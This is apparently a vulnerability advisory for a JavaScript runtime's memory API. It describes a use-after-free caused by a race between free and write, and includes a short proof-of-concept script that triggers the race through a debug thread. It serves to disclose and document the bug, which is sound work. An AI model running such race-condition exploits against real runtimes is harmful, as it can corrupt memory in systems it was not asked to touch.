# VID 012: UseAfterFree Vulnerability

### Description

A attacker may be able to write to a already released memory address, caused by a race condition where free needs sometimes less time than write to check the safety array which causes free to release the memory and write to then commit its change to the memory.

(threading is in debug)

Introduced in: n/a

fixed in: n/a

Credit: [@seanistethered](https://github.com/seanistethered)

---

### Exploitation

```js
// before treggering the UAF we allocate zombie pointers to ensure both have to do something
for(let i = 0; i < 10000; i++)
{
  memory.malloc(1);
}

// the race function
function race()
{
  obj.memory.mwrite8(obj.ptr, 0);
  return 0;
}

// now the actual pointer we gonna use after free
let ptr = memory.malloc(1);

// object we gonna pass to the thread
let tobj = {
  memory: memory,
  ptr: ptr,
};

// now we trigger the thread
debug_thread(race, tobj, "race", "obj");

// now we free the memory while the thread runs
memory.free(ptr);

// to ensure everything worse fine(I still need to add dispatch grouping so that the Runtime waits till the other threads are done too)
timer.wait(5);
```

